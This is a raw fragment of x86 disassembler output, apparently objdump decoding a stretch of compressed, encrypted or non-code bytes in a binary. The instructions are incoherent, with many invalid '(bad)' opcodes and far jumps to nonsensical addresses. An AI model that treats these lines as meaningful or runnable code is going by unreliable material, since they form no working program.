  415fbc:	ins    BYTE PTR es:[edi],dx
  415fbd:	adc    al,0x50
  415fbf:	dec    ecx
  415fc0:	pop    eax
  415fc1:	(bad)  
  415fc2:	iret   
  415fc3:	mov    cl,0xdc
  415fc5:	pop    edx
  415fc6:	pop    eax
  415fc7:	sti    
  415fc8:	hlt    
  415fc9:	mov    eax,ds:0x4a0154f7
  415fce:	ins    DWORD PTR es:[edi],dx
  415fcf:	fst    QWORD PTR [ecx+0x75]
  415fd2:	jmp    0x415f6b
  415fd4:	lea    esp,[esi]
  415fd6:	adc    ecx,DWORD PTR [ebx]
  415fd8:	test   al,0x55
  415fda:	xor    BYTE PTR [eax+0x4d],dh
  415fdd:	inc    eax
  415fde:	jge    0x416058
  415fe0:	inc    edx
  415fe1:	push   DWORD PTR [ebp+edx*2-0x42]
  415fe5:	xchg   edi,eax
  415fe6:	xor    DWORD PTR [edi+0x79],ecx
  415fe9:	push   ebp
  415fea:	cvtps2pi mm3,QWORD PTR [edx-0x39111d78]
  415ff1:	jb     0x415fba
  415ff3:	loopne 0x415fec
  415ff5:	xchg   esi,eax
  415ff6:	cld    
  415ff7:	mov    eax,0xa91a4969
  415ffc:	popf   
  415ffd:	mov    al,ds:0x201ca6d0
  416002:	mov    ebp,0xcaf22faa
  416007:	pop    esp
  416008:	in     al,dx
  416009:	out    dx,al
  41600a:	shl    DWORD PTR [esp+eax*2+0x4d90b2a8],1
  416011:	lods   eax,DWORD PTR ds:[esi]
  416012:	push   edi
  416013:	cmp    al,BYTE PTR [ecx]
  416015:	sbb    al,0xab
  416017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416018:	retf   0xe2f5
  41601b:	inc    edx
  41601c:	pop    esp
  41601d:	inc    esp
  41601e:	pop    es
  41601f:	xchg   esp,eax
  416020:	add    BYTE PTR [ebp-0x74],ch
  416023:	leave  
  416024:	sbb    esp,eax
  416026:	ret    
  416027:	and    DWORD PTR [ecx+0x51682f45],ecx
  41602d:	jne    0x4160ad
  41602f:	push   ebp
  416030:	sbb    eax,0x81083a0c
  416035:	rol    DWORD PTR [eax],cl
  416037:	mov    gs,ebp
  416039:	in     eax,dx
  41603a:	pusha  
  41603b:	and    al,0xee
  41603d:	mov    edi,0x415f5abc
  416042:	sbb    DWORD PTR [ecx+0x4f5e69ad],edx
  416048:	lods   eax,DWORD PTR ds:[esi]
  416049:	jo     0x41606c
  41604b:	mov    bl,0xc1
  41604d:	jnp    0x4160b1
  41604f:	push   esi
  416050:	sbb    DWORD PTR [eax],esp
  416052:	cmp    al,0x46
  416054:	icebp  
  416055:	jbe    0x416045
  416057:	push   edx
  416058:	xor    ebx,ecx
  41605a:	adc    eax,0xd604f103
  41605f:	out    0xe9,al
  416061:	fabs   
  416063:	(bad)  
  416064:	sahf   
  416065:	add    esp,edi
  416067:	ret    0x1773
  41606a:	or     eax,0xbd1bed8e
  41606f:	jnp    0x415ff2
  416071:	in     al,0x33
  416073:	mov    ah,0x17
  416075:	mov    BYTE PTR [esi],ch
  416077:	mov    edi,0x114f18a1
  41607c:	or     eax,0x96d1b018
  416081:	cmp    DWORD PTR [edx],ecx
  416083:	pop    edx
  416084:	daa    
  416085:	add    dl,ch
  416087:	ds dec esi
  416089:	repz sbb al,0x32
  41608c:	sbb    eax,0xbee73e9a
  416091:	sbb    eax,0x9c07c4df
  416096:	loop   0x4160ae
  416098:	mov    bh,0x64
  41609a:	cmp    eax,0x9dccb0e5
  41609f:	hlt    
  4160a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160a1:	lock sbb BYTE PTR ds:0xb46ce111,al
  4160a8:	mov    ecx,0x6b02f18f
  4160ad:	std    
  4160ae:	push   esi
  4160af:	push   0x14
  4160b1:	mov    WORD PTR ds:0x4298224c,es
  4160b7:	push   es
  4160b8:	out    dx,al
  4160b9:	hlt    
  4160ba:	fs cli 
  4160bc:	and    al,BYTE PTR [eax-0x4835fe7d]
  4160c2:	xchg   BYTE PTR [esi-0x44],ch
  4160c5:	rol    DWORD PTR [ebp+0x1441c675],1
  4160cb:	add    DWORD PTR [edi],edx
  4160cd:	dec    ebx
  4160ce:	mov    cl,0xb
  4160d0:	nop
  4160d1:	mov    cl,0x31
  4160d3:	xor    DWORD PTR [esi+0xeb34dc3],0x695f9201
  4160dd:	dec    esi
  4160de:	fisttp WORD PTR [edi]
  4160e0:	jno    0x4160e0
  4160e2:	push   ebx
  4160e3:	in     al,0x79
  4160e5:	gs scas al,BYTE PTR es:[edi]
  4160e7:	pop    ebx
  4160e8:	es retf 0x5e7c
  4160ec:	inc    esi
  4160ed:	pop    eax
  4160ee:	(bad)  
  4160ef:	not    BYTE PTR [esi]
  4160f1:	push   ebp
  4160f2:	sbb    eax,ebp
  4160f4:	shr    edi,0x8d
  4160f7:	cmp    ecx,esi
  4160f9:	outs   dx,BYTE PTR ds:[esi]
  4160fa:	repz mov al,0xe6
  4160fd:	mov    cl,BYTE PTR [ebp+0xe]
  416100:	mov    bh,0xd1
  416102:	pop    esi
  416103:	das    
  416104:	sub    ebp,DWORD PTR ds:0x867c2af9
  41610a:	inc    edi
  41610b:	xchg   edi,eax
  41610c:	xchg   esp,eax
  41610d:	mov    ebx,0xccb7e5c6
  416112:	cmp    eax,0xf542732b
  416117:	jmp    0x4160b2
  416119:	xor    eax,0xcdddb0fd
  41611e:	aad    0xf9
  416120:	push   0xbeb2fa1e
  416125:	jmp    0x370e:0xa9468fa2
  41612c:	std    
  41612d:	(bad)  
  41612e:	mov    dh,0xe1
  416130:	sub    al,dl
  416132:	cmp    eax,0x4c3b202d
  416137:	call   0xa1e6b108
  41613c:	repnz cmc 
  41613e:	push   edi
  41613f:	xor    al,0x6d
  416141:	sub    al,0xad
  416143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416144:	inc    esi
  416145:	loop   0x416119
  416147:	xor    eax,0x3283861f
  41614c:	sbb    eax,DWORD PTR [edx]
  41614e:	cmp    edx,esi
  416150:	sahf   
  416151:	inc    esi
  416152:	adc    eax,0xd4c33990
  416157:	out    dx,eax
  416158:	push   0x28
  41615a:	fdiv   DWORD PTR [esi]
  41615c:	adc    al,0x73
  41615e:	retf   
  41615f:	mov    BYTE PTR [edx-0xc0458a2],ah
  416165:	data16 ja 0x41615c
  416168:	stos   DWORD PTR es:[edi],eax
  416169:	or     BYTE PTR [eax-0x7127ee5a],ah
  41616f:	int3   
  416170:	call   0x9e9a3c7a
  416175:	add    ah,BYTE PTR [ebp+0x2a]
  416178:	dec    edi
  416179:	ds push ebp
  41617b:	lea    edx,[ecx+ebx*8]
  41617e:	sbb    eax,0x85c0c41c
  416183:	dec    edx
  416184:	fistp  QWORD PTR [edx]
  416186:	push   edi
  416187:	inc    ebp
  416188:	jmp    0x9a8d:0x6723f562
  41618f:	push   edi
  416190:	mov    DWORD PTR [eax+ebp*2-0x7f],0x7fb29b2e
  416198:	xchg   edx,eax
  416199:	xchg   esp,eax
  41619a:	stc    
  41619b:	pop    ds
  41619c:	int    0x9d
  41619e:	imul   edx,esi,0xfffffff8
  4161a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161a2:	out    dx,al
  4161a3:	mov    ah,0x35
  4161a5:	pop    ds
  4161a6:	call   0x82ba:0x927e3788
  4161ad:	not    DWORD PTR [ebx]
  4161af:	lds    esp,FWORD PTR [eax-0x38]
  4161b2:	hlt    
  4161b3:	mov    al,0xb1
  4161b5:	stos   DWORD PTR es:[edi],eax
  4161b6:	out    0xf5,eax
  4161b8:	enter  0xc593,0x14
  4161bc:	add    eax,0x9c16c189
  4161c1:	sahf   
  4161c2:	inc    ebx
  4161c3:	push   ebp
  4161c4:	sub    al,0x45
  4161c6:	loopne 0x41620c
  4161c8:	xor    DWORD PTR [edx-0x21],ecx
  4161cb:	cmp    eax,0x2fa3103e
  4161d0:	loope  0x41615e
  4161d2:	nop
  4161d3:	fistp  WORD PTR [edx-0x8c1c959]
  4161d9:	and    al,0x33
  4161db:	sub    edi,DWORD PTR [edi*4+0x6bef3fda]
  4161e2:	cld    
  4161e3:	test   DWORD PTR [ebx],edi
  4161e5:	out    dx,al
  4161e6:	pop    ecx
  4161e7:	cmp    cl,dl
  4161e9:	dec    ebp
  4161ea:	retf   0x4d35
  4161ed:	loopne 0x4161a7
  4161ef:	test   eax,0x4e6ab065
  4161f4:	hlt    
  4161f5:	das    
  4161f6:	fdivr  DWORD PTR [esi]
  4161f8:	inc    eax
  4161f9:	mov    WORD PTR [ebp-0x57fc9a5a],?
  4161ff:	imul   esp,DWORD PTR [ecx],0x22
  416202:	xchg   edi,eax
  416203:	jns    0x416247
  416205:	fcomp  DWORD PTR [ebx-0x62f267db]
  41620b:	lds    ecx,FWORD PTR [ecx-0x1a]
  41620e:	sbb    bl,BYTE PTR [ebx-0x33813bf6]
  416214:	test   BYTE PTR [ebx+edi*1],ah
  416217:	mov    ebx,DWORD PTR [ebx]
  416219:	les    ecx,FWORD PTR [edx+0x17]
  41621c:	adc    DWORD PTR [edi-0x7e],ecx
  41621f:	sbb    ebp,ebp
  416221:	and    DWORD PTR [edi+0x6c6e5241],eax
  416227:	cwde   
  416228:	add    al,0x40
  41622a:	xchg   esp,ebp
  41622c:	les    ebx,FWORD PTR [edx]
  41622e:	push   edx
  41622f:	shl    DWORD PTR [edx-0x35c8e4fb],cl
  416235:	sub    DWORD PTR [esi],esp
  416237:	sbb    eax,ebx
  416239:	nop
  41623a:	loope  0x416273
  41623c:	mov    esp,0x15f0b328
  416241:	lea    edi,[ecx-0x167b9984]
  416247:	shl    BYTE PTR [ecx],cl
  416249:	jmp    0x41625a
  41624b:	mov    al,0xdf
  41624d:	jg     0x4162c6
  41624f:	or     bl,ah
  416251:	fldenv [eax-0x24]
  416254:	pop    ss
  416255:	hlt    
  416256:	loop   0x416267
  416258:	inc    eax
  416259:	retf   
  41625a:	ret    0xedb
  41625d:	xchg   ecx,eax
  41625e:	jge    0x416284
  416260:	cmp    eax,0x61f53428
  416265:	nop
  416266:	or     al,0xad
  416268:	dec    esp
  416269:	dec    ebx
  41626a:	mov    BYTE PTR [edi+0x75],cl
  41626d:	jo     0x4162ac
  41626f:	mov    ch,0x4f
  416271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416272:	mov    dh,bh
  416274:	cmc    
  416275:	test   eax,0x54b09f93
  41627a:	popa   
  41627b:	int    0xbe
  41627d:	imul   eax,DWORD PTR [edi+0x59f1694a],0x64
  416284:	pop    es
  416285:	retf   0x8bf1
  416288:	xchg   edx,eax
  416289:	dec    ecx
  41628a:	lock and eax,0xb60f28e0
  416290:	jo     0x4162d3
  416292:	in     al,0x53
  416294:	shr    esi,1
  416296:	lea    ebx,es:[esi]
  416299:	add    ebx,ecx
  41629b:	rol    DWORD PTR [edx-0x346a20ad],cl
  4162a1:	sub    edi,DWORD PTR [eax]
  4162a3:	mov    esp,ecx
  4162a5:	shl    dh,1
  4162a7:	ins    DWORD PTR es:[edi],dx
  4162a8:	mov    ecx,0x326602c9
  4162ad:	dec    ebx
  4162ae:	adc    esi,DWORD PTR [eax]
  4162b0:	mov    edi,fs
  4162b2:	dec    edx
  4162b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b4:	add    BYTE PTR [ecx],bh
  4162b6:	sahf   
  4162b7:	cwde   
  4162b8:	mov    edi,0x339cdc24
  4162bd:	dec    ebx
  4162be:	lods   al,BYTE PTR ds:[esi]
  4162bf:	ja     0x416335
  4162c1:	sbb    DWORD PTR [ebx+0x36500230],ebx
  4162c7:	shl    BYTE PTR [esi-0x47],cl
  4162ca:	(bad)  
  4162cb:	int    0x8b
  4162cd:	pop    ebp
  4162ce:	cdq    
  4162cf:	add    BYTE PTR [edi],ch
  4162d1:	into   
  4162d2:	add    al,0x73
  4162d4:	popf   
  4162d5:	xchg   ebp,eax
  4162d6:	or     bl,ch
  4162d8:	mov    dl,0x1
  4162da:	jb     0x416348
  4162dc:	pop    esp
  4162dd:	add    eax,0xa4e57f32
  4162e2:	scas   al,BYTE PTR es:[edi]
  4162e3:	sahf   
  4162e4:	jmp    0xd332c297
  4162e9:	jecxz  0x416320
  4162eb:	mov    ecx,0x719af680
  4162f0:	aam    0x2c
  4162f2:	ins    BYTE PTR es:[edi],dx
  4162f3:	ss addr16 ja 0x416314
  4162f7:	stos   DWORD PTR es:[edi],eax
  4162f8:	cmp    eax,0x3c67033e
  4162fd:	daa    
  4162fe:	gs sbb al,al
  416301:	outs   dx,DWORD PTR ds:[esi]
  416302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416303:	jne    0x416291
  416305:	scas   eax,DWORD PTR es:[edi]
  416306:	cmovae edx,DWORD PTR [edx+0x611fdefd]
  41630d:	sahf   
  41630e:	pop    es
  41630f:	and    al,0xc0
  416311:	idiv   BYTE PTR [esi-0x66]
  416314:	add    al,0x90
  416316:	inc    ebx
  416317:	dec    esi
  416318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416319:	rcr    DWORD PTR [edi+ebx*1-0x33dc9aed],0xb2
  416321:	loop   0x4162b4
  416323:	dec    esi
  416324:	popf   
  416325:	adc    edx,edi
  416327:	gs push 0x43
  41632a:	sbb    DWORD PTR [ebx+0xf4eb42a],ecx
  416330:	and    eax,0x18dcecaf
  416335:	sub    ah,BYTE PTR [edx-0x32409d07]
  41633b:	ds sbb eax,0xbf580aa5
  416341:	loop   0x416312
  416343:	inc    ebx
  416344:	dec    edi
  416346:	dec    eax
  416347:	mov    eax,0xc42b4456
  41634c:	les    ebx,FWORD PTR [eax+0x51]
  41634f:	xor    ah,BYTE PTR [ebp-0x67]
  416352:	in     al,dx
  416353:	dec    ebp
  416354:	mov    ebp,0x76e14aec
  416359:	sub    dl,BYTE PTR [ecx]
  41635b:	out    dx,eax
  41635c:	mov    WORD PTR [ebx+ebp*8],fs
  41635f:	push   edi
  416360:	mov    ebp,0x97d4dd72
  416365:	iret   
  416366:	es and eax,0x774c0099
  41636c:	mov    ebp,0xc13b76
  416371:	mov    ds:0x2c9d1ae2,al
  416376:	outs   dx,BYTE PTR ds:[esi]
  416377:	mov    dh,0x4e
  416379:	xchg   DWORD PTR [edx+0x3],edx
  41637c:	call   0x1adc:0xa4355a8
  416383:	fst    DWORD PTR [edi-0x5d278703]
  416389:	in     al,0x90
  41638b:	imul   ecx,DWORD PTR cs:[eax-0x45],0xffffffad
  416390:	fnsave [edi+ebx*4+0x49]
  416394:	add    DWORD PTR cs:[edx-0x52dd8567],ebx
  41639b:	aaa    
  41639c:	sbb    edi,DWORD PTR [ebx+eiz*4-0x39]
  4163a0:	mov    ch,0xcf
  4163a2:	sub    BYTE PTR [ebx+0x38],dh
  4163a5:	loope  0x41636e
  4163a7:	jg     0x41640b
  4163a9:	mov    esp,0x69407014
  4163ae:	jno    0x4163e8
  4163b0:	stc    
  4163b1:	call   0x2d5fd78c
  4163b6:	add    BYTE PTR [edx],0x81
  4163b9:	pop    esi
  4163ba:	neg    eax
  4163bc:	out    0xd7,al
  4163be:	shl    DWORD PTR [ebp+0x29],cl
  4163c1:	stos   BYTE PTR es:[edi],al
  4163c2:	cmc    
  4163c3:	enterw 0x9924,0x52
  4163c8:	leave  
  4163c9:	jecxz  0x41641b
  4163cb:	stos   BYTE PTR es:[edi],al
  4163cc:	pop    esp
  4163cd:	es cmc 
  4163cf:	sub    ecx,DWORD PTR [edi-0x4edd4228]
  4163d5:	aas    
  4163d6:	push   eax
  4163d7:	xchg   ecx,eax
  4163d8:	imul   ebp,DWORD PTR [ebx+0x7b441405],0xffffffaa
  4163df:	repz int 0x43
  4163e2:	out    dx,eax
  4163e3:	adc    DWORD PTR [esi-0x54],ebx
  4163e6:	and    eax,0xd0fd6d89
  4163eb:	dec    ebx
  4163ec:	push   0xffffff92
  4163ee:	call   0x8d41:0x14dfa0bc
  4163f5:	dec    ecx
  4163f6:	lods   eax,DWORD PTR ds:[esi]
  4163f7:	dec    ebp
  4163f8:	or     edx,DWORD PTR [ecx+0x6e7eae4a]
  4163fe:	pop    es
  4163ff:	in     al,dx
  416400:	push   cs
  416401:	push   0x46
  416403:	pop    edx
  416404:	mov    cs,WORD PTR [ebx+eax*1-0x6928d351]
  41640b:	fldcw  WORD PTR [esi]
  41640d:	lock or eax,eax
  416410:	je     0x416425
  416412:	mov    dl,0xf3
  416414:	cmc    
  416415:	test   eax,0x32b63bac
  41641a:	xchg   esi,eax
  41641b:	jne    0x4163a4
  41641d:	push   esp
  41641e:	xchg   ebx,eax
  41641f:	je     0x4163ab
  416421:	mov    esi,0xbea7ee01
  416426:	in     al,0xfc
  416428:	fwait
  416429:	rcl    edi,1
  41642b:	(bad)  
  41642d:	xchg   DWORD PTR [edi],ebp
  41642f:	adc    al,0xb3
  416431:	retf   0xc01b
  416434:	pop    ebp
  416435:	adc    ecx,DWORD PTR [ebx+0x1964fa96]
  41643b:	mov    ds:0xe5743780,al
  416440:	icebp  
  416441:	push   edx
  416442:	jle    0x416483
  416444:	dec    eax
  416445:	pushf  
  416446:	and    bl,bh
  416448:	mov    eax,0xe3e1a090
  41644d:	aad    0x11
  41644f:	xor    bl,BYTE PTR [eax+0x59e0a35c]
  416455:	mul    DWORD PTR [ebx-0x17]
  416458:	sbb    al,0x9
  41645a:	ins    DWORD PTR es:[edi],dx
  41645b:	and    BYTE PTR [eax],al
  41645d:	outs   dx,DWORD PTR ds:[esi]
  41645e:	in     eax,0x4f
  416460:	ds jmp 0x6b1:0x1662ff5b
  416468:	cmp    ah,BYTE PTR [edi]
  41646a:	fdiv   st(2),st
  41646c:	xor    al,0xe1
  41646e:	sbb    dh,BYTE PTR [esi-0x2b]
  416471:	jl     0x41643c
  416473:	mov    ebx,DWORD PTR [ebx-0xa81fcfa]
  416479:	and    eax,0x6c7c00f9
  41647f:	jne    0x416422
  416481:	retf   0x9eef
  416484:	pusha  
  416485:	mov    al,0x96
  416487:	sahf   
  416488:	(bad)  
  416489:	inc    edx
  41648a:	xchg   edx,eax
  41648b:	mov    edx,0x6c1fbbef
  416490:	(bad)  
  416492:	(bad)  
  416495:	cwde   
  416496:	mov    ebp,0xd5e3cf1e
  41649b:	xchg   edx,eax
  41649c:	cmp    bl,bl
  41649e:	adc    eax,0xe63028f4
  4164a3:	sbb    DWORD PTR [ecx-0x63],eax
  4164a6:	sub    cl,BYTE PTR [esi+0x11]
  4164a9:	retf   
  4164aa:	scas   al,BYTE PTR es:[edi]
  4164ab:	mov    ds:0x81fc36a1,eax
  4164b0:	and    DWORD PTR [edi+ecx*2+0x70],esp
  4164b4:	retf   
  4164b5:	inc    eax
  4164b6:	cmp    al,0xcc
  4164b8:	loopne 0x416473
  4164ba:	push   edx
  4164bb:	adc    BYTE PTR ds:0xb328c3a9,0x34
  4164c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164c3:	mov    ds:0x36a83b46,eax
  4164c8:	add    eax,0xb0476af2
  4164cd:	stc    
  4164ce:	push   ebp
  4164cf:	and    edi,ebx
  4164d1:	cdq    
  4164d2:	mov    ds:0xabe0fb2e,eax
  4164d7:	sbb    al,0xfe
  4164d9:	aam    0xcf
  4164db:	cmp    DWORD PTR [ecx+0x6],edi
  4164de:	bound  ebx,QWORD PTR [edi+0x6dd30656]
  4164e4:	pop    ds
  4164e5:	push   0x54b6fbeb
  4164ea:	xor    edx,ebp
  4164ec:	lea    ecx,[esi-0x8eb1459]
  4164f2:	mov    dl,0xd0
  4164f4:	aas    
  4164f5:	xchg   edi,eax
  4164f6:	jne    0x416502
  4164f8:	popf   
  4164f9:	pop    edi
  4164fa:	(bad)  
  4164fb:	mov    al,0x4
  4164fd:	pushf  
  4164fe:	into   
  4164ff:	or     ch,BYTE PTR [eax]
  416501:	mov    ds:0xa845349c,al
  416506:	call   0x38a7acd9
  41650b:	enter  0x23c,0xa5
  41650f:	mov    eax,0x675d2373
  416514:	out    dx,al
  416515:	nop
  416516:	fstp   QWORD PTR [ecx-0x7d]
  416519:	(bad)  
  41651a:	fucom  st(3)
  41651c:	popf   
  41651d:	mov    dl,0x59
  41651f:	outs   dx,BYTE PTR ds:[esi]
  416520:	or     cl,BYTE PTR [ecx]
  416522:	push   esp
  416523:	ds push ss
  416525:	xchg   ebp,eax
  416526:	xchg   edi,eax
  416527:	cmp    BYTE PTR [ecx],0xf5
  41652a:	add    dh,dh
  41652c:	popw   ds
  41652e:	lock ss xchg esi,eax
  416531:	or     esi,DWORD PTR [edx-0xb0c407c]
  416537:	pop    ecx
  416538:	sbb    eax,0x26152711
  41653d:	pop    ds
  41653e:	cmp    eax,0xfd3791ac
  416543:	xchg   esi,eax
  416544:	xchg   ebx,eax
  416545:	xchg   ecx,eax
  416546:	test   DWORD PTR [esi-0x1c],ebp
  416549:	lea    ebp,[esi]
  41654b:	in     eax,dx
  41654c:	ins    BYTE PTR es:[edi],dx
  41654d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41654e:	mov    esp,0x8a997351
  416553:	jbe    0x4165a3
  416555:	int    0xeb
  416557:	je     0x41651a
  416559:	mov    dh,0x17
  41655b:	cbw    
  41655d:	sub    ecx,ebx
  41655f:	in     al,dx
  416560:	or     al,0xe
  416562:	xor    DWORD PTR [ecx],esi
  416564:	das    
  416565:	jb     0x4164fc
  416567:	iret   
  416568:	sahf   
  416569:	jo     0x416587
  41656b:	mov    BYTE PTR [esi],ah
  41656d:	fs out dx,al
  41656f:	add    BYTE PTR ss:[edi+eiz*1],bh
  416573:	cmp    eax,0x416b8ff0
  416579:	push   DWORD PTR [eax-0x60]
  41657c:	mov    ds:0x9a1fcc30,al
  416581:	xchg   esp,eax
  416582:	or     edi,DWORD PTR [ebp+0x23]
  416585:	das    
  416586:	mov    dl,0x2e
  416588:	add    BYTE PTR cs:[edi],al
  41658b:	or     DWORD PTR [ebx],ebp
  41658d:	and    eax,0xfd52a52f
  416592:	push   0xffffffac
  416594:	jmp    0x592ef319
  416599:	mov    ebp,0x7239cf04
  41659e:	cld    
  41659f:	adc    eax,0x7ec1fa55
  4165a4:	ret    0x2e4e
  4165a7:	lea    ecx,[ecx-0x5078bfd2]
  4165ad:	add    eax,0x71ff0c17
  4165b2:	inc    esp
  4165b3:	mov    edi,0x35af1564
  4165b8:	add    BYTE PTR [eax],bh
  4165ba:	cld    
  4165bb:	stos   DWORD PTR es:[edi],eax
  4165bc:	(bad)  
  4165bd:	push   edi
  4165be:	out    0x6a,eax
  4165c0:	lods   al,BYTE PTR ds:[esi]
  4165c1:	dec    edi
  4165c2:	lock xlat BYTE PTR ds:[ebx]
  4165c4:	mov    ds:0x2b4ab82,al
  4165c9:	loopne 0x4165e2
  4165cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165cc:	inc    ebx
  4165cd:	sub    al,0x2d
  4165cf:	or     DWORD PTR [ebx-0x16],edi
  4165d2:	jmp    0x416573
  4165d4:	jge    0x416579
  4165d6:	push   es
  4165d7:	mov    eax,0xc5950564
  4165dc:	icebp  
  4165dd:	pop    esp
  4165de:	repz aaa 
  4165e0:	je     0x416571
  4165e2:	inc    edi
  4165e3:	sar    BYTE PTR [ecx+0x28],0x1
  4165e7:	add    al,0x62
  4165e9:	mov    bl,0x4a
  4165eb:	inc    ch
  4165ed:	call   0xe21a:0x810ace43
  4165f4:	lods   al,BYTE PTR ds:[esi]
  4165f5:	xchg   edx,eax
  4165f6:	sbb    ecx,ecx
  4165f8:	adc    DWORD PTR [ecx],ebx
  4165fa:	sbb    edi,DWORD PTR [ecx-0x5d]
  4165fd:	nop
  4165fe:	xlat   BYTE PTR ds:[ebx]
  4165ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416600:	pop    ecx
  416601:	push   ds
  416602:	ror    DWORD PTR [ecx+0x5e],1
  416605:	fldenv [esi+0x7dd5148b]
  41660b:	jp     0x41665d
  41660d:	in     al,0xb9
  41660f:	lock movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416612:	loopne 0x416607
  416614:	retf   0xfe6a
  416617:	push   edi
  416618:	in     al,0xff
  41661a:	(bad)  
  41661b:	push   0xffffff87
  41661d:	in     al,0x8
  41661f:	xchg   bh,bh
  416621:	jge    0x416684
  416623:	loop   0x41668d
  416625:	ror    DWORD PTR [eax-0x420dda4],1
  41662b:	jmp    0x4165fe
  41662d:	sub    DWORD PTR [eax+0x5c4765b5],esi
  416633:	mov    ebx,0xdd2b603e
  416638:	enter  0x92cb,0x2c
  41663c:	mov    esp,0xab5ad440
  416641:	ror    DWORD PTR [edx-0x282cee72],cl
  416647:	stos   DWORD PTR es:[edi],eax
  416648:	add    al,0xfd
  41664a:	loope  0x41666c
  41664c:	popa   
  41664d:	out    0x31,al
  41664f:	mov    esp,DWORD PTR [edx-0x10341bc8]
  416655:	jmp    0x4165f8
  416657:	pop    esi
  416658:	jno    0x41669e
  41665a:	adc    eax,0x1b5cd92d
  41665f:	enter  0xdc90,0x53
  416663:	add    BYTE PTR [eax+eax*8-0x63],0x4c
  416668:	mov    edx,0xc8b69152
  41666d:	fwait
  41666e:	mov    bh,BYTE PTR [edx-0x47]
  416671:	lea    esp,[eax]
  416673:	push   esi
  416674:	mov    eax,gs:0x79a8b0db
  41667a:	lock mov cl,0x16
  41667d:	inc    esp
  41667e:	ds add eax,0xd5a977d3
  416684:	rcl    BYTE PTR [edi],0xce
  416687:	mov    dh,BYTE PTR [ebp-0x4ec0c27]
  41668d:	dec    ebp
  41668e:	mov    edx,0x51c1df29
  416693:	sbb    BYTE PTR [esi-0x68],al
  416696:	mov    WORD PTR [edx+0x43920649],fs
  41669c:	loop   0x416691
  41669e:	cli    
  41669f:	dec    esp
  4166a0:	(bad)  
  4166a1:	loop   0x4166c5
  4166a3:	fistp  WORD PTR [ebx+0x612b8c31]
  4166a9:	cdq    
  4166aa:	jg     0x416678
  4166ac:	jmp    0x41666c
  4166ae:	imul   esi,DWORD PTR [eax+0x40],0xd7031c06
  4166b5:	je     0x41668b
  4166b7:	(bad)  
  4166b8:	dec    ebx
  4166b9:	push   es
  4166ba:	fcom   QWORD PTR [edi+0x26db9111]
  4166c0:	or     esi,ecx
  4166c2:	call   0xa4c1e5
  4166c7:	scas   al,BYTE PTR es:[edi]
  4166c8:	imul   edx,DWORD PTR [ebx],0xf29283c7
  4166ce:	jmp    eax
  4166d0:	cmp    esp,edx
  4166d2:	add    BYTE PTR [ebp+esi*4+0x75],dl
  4166d6:	xor    eax,DWORD PTR [edx+edx*4+0x7d6cf2a4]
  4166dd:	mov    edi,0x7faa9b6
  4166e2:	xchg   ecx,eax
  4166e3:	sub    ebx,eax
  4166e5:	mov    ch,0xf0
  4166e7:	repz xchg esp,eax
  4166e9:	test   DWORD PTR [ecx],0x3bf57464
  4166ef:	loop   0x4166ec
  4166f1:	mov    ds:0x61a00520,al
  4166f6:	mov    esp,0xee980775
  4166fb:	aad    0xa
  4166fd:	test   eax,0x12c60750
  416702:	jns    0x416699
  416704:	in     eax,dx
  416705:	loopne 0x416766
  416707:	or     al,0xaa
  416709:	cld    
  41670a:	cdq    
  41670b:	mov    dh,0x94
  41670d:	aad    0xef
  41670f:	stc    
  416710:	outs   dx,BYTE PTR ds:[esi]
  416711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416712:	inc    ecx
  416713:	test   eax,0xa53ecddf
  416718:	pop    edi
  416719:	dec    edi
  41671a:	or     eax,0xc2ec78dc
  41671f:	inc    ebp
  416720:	jecxz  0x416704
  416722:	sbb    BYTE PTR [edi+0x16a67b9],dl
  416728:	ins    BYTE PTR es:[edi],dx
  416729:	(bad)  
  41672a:	cdq    
  41672b:	(bad)  [edi+eax*2-0x5b189b12]
  416732:	push   edi
  416733:	pop    edx
  416734:	jno    0x4167b4
  416736:	(bad)  
  416737:	loop   0x416779
  416739:	and    eax,0x9817792c
  41673e:	iret   
  41673f:	or     DWORD PTR [edi-0x2238c22c],eax
  416745:	lods   al,BYTE PTR ds:[esi]
  416746:	and    DWORD PTR [eax+0x4554d4e1],esi
  41674c:	push   ebp
  41674d:	mov    WORD PTR [edx+eiz*1+0x60],gs
  416751:	cwde   
  416752:	xchg   ecx,eax
  416753:	pop    ds
  416754:	inc    esp
  416755:	int    0x99
  416757:	adc    DWORD PTR [bx+si],edi
  41675a:	pop    esp
  41675b:	aam    0x1f
  41675d:	scas   al,BYTE PTR es:[edi]
  41675e:	in     al,dx
  41675f:	push   0x187d2df3
  416764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416765:	lods   al,BYTE PTR ds:[esi]
  416766:	sahf   
  416767:	es out dx,al
  416769:	ds in  al,0x59
  41676c:	mov    ah,0xc8
  41676e:	icebp  
  41676f:	jmp    0x271a:0xca9162bd
  416776:	inc    ecx
  416777:	retf   
  416778:	sbb    DWORD PTR [bx-0x1a],eax
  41677c:	jge    0x4167c6
  41677e:	scas   eax,DWORD PTR es:[edi]
  41677f:	fistp  QWORD PTR [ebp-0x51bd5b21]
  416785:	jbe    0x4167b7
  416787:	cmp    eax,0x8ac11063
  41678c:	ja     0x41674a
  41678e:	ret    
  41678f:	in     eax,dx
  416790:	adc    ebx,DWORD PTR [eax-0x5dc41ceb]
  416796:	sbb    al,BYTE PTR [eax]
  416798:	test   eax,0x474aa8e1
  41679d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41679e:	pop    edx
  41679f:	push   ecx
  4167a0:	pusha  
  4167a1:	(bad)  
  4167a2:	push   es
  4167a3:	call   0xbfa525e0
  4167a8:	fwait
  4167a9:	pusha  
  4167aa:	mov    ebp,0xe4c86c07
  4167af:	out    0xfc,al
  4167b1:	xlat   BYTE PTR ds:[ebx]
